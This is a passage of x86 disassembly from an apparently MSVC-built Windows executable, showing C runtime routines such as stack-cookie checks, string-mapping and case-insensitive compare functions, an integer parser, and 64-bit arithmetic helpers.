  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
